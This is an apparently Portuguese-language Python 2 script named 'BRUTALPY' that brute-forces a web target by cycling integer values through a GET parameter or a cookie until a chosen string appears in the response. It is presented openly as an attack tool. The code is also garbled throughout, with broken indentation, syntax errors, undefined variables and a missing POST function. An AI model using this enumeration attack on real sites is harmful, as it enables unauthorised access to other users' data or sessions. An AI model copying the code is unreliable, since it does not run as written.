import urllib
import urllib2

    def welcome_msg
        print '|----------------------------------------------------------------------|'
        print '|                       BEM VINDO AO BRUTALPY                          |'
        print '|                               D3@d                                   |'
        print '|----------------------------------------------------------------------|'

    def prompt(msg, error_msg):
        while True:
            prompt = raw_input(str(msg)+': ')
            if prompt == '':
                print 'ERRO: '+str(mensagem_de_erro)+'!'
            else:
                break
            return prompt.lower()
        def get_attack(url, string):
            name = prompt('Por favor,informe o nome do parametro GET' , 'Nome vazio nao e permitido')
            print '[+] ATAQUE INICIADO!'
            n = 0
            while True:
                print '[+] Tentando '+str(name)+' = 'str(n)'
                values = {name : n}
                data = urllib.urlencode(values)
                req = urllib2.Request(url , data)
                response = urllib2.urlopen(req).read()
                if string.lower() in response.lower():
                    print '[+] Ataque Bem-Sucedido!Sucesso ao encontrar string em '+str(name)+' = '+str(n)
                answer = prompt('Você deseja que a resposta apareça aqui? (SIM / NAO)' , 'A')
                if answer == 'SIM':
                    print '\n## RESPOSTA ##\n\n' +response
                break
            n = n+1
                return
            def cookie_attack(url, string):
            name = prompt ('Por favor,digite o nome do cookie' , 'O nome do cookie está vazio,não é permitido')
            print '[+]ATAQUE INICIADO!'
            n = 0
            while True:
                print '[+]Tentando'+str(name)+' = '+str(n)
                opener = urllib2.build_opener()
                opener.addheaders.append(('Cookie', str(name)+'='+str(n)))
                response = opener.open(url).read()
                if string.lower() in response.lower():
                    print '[+] Ataque Bem-Sucedido! Sucesso em encontrar string em '+str(name)+' = '+str(n)
                    answer = prompt('Quer que a resposta seja postada aqui? (SIM / NAO)' , 'A')
                    if answer == 'SIM':
                        print '\n## RESPONSE ##\n\n'+response
                    break
                n = n+1
            return

        def get_options():
url = prompt('Por favor,entre com a URL(e necessario com uma barra a direita)' , 'URL vazia nao será aceita'
        while True:
            vector = raw_input('Por favor,escolha um vetor de ataque(GET, POST, COOKIE): ')
        if vector.lower() == 'get':
        get_attack(url,string)
             break
        elif vector.lower() == 'post':
        post_attack(url,string)
             break
        elif vector.lower()== 'cookie':
        cookie_attack(url,string)
             break
        else:
          print 'ERRO:VETOR DE ATAQUE INVÁLIDO!'
        def main():
         welcome_msg()
         get_options()
         print '\n## Fim do Script ##'

    main()
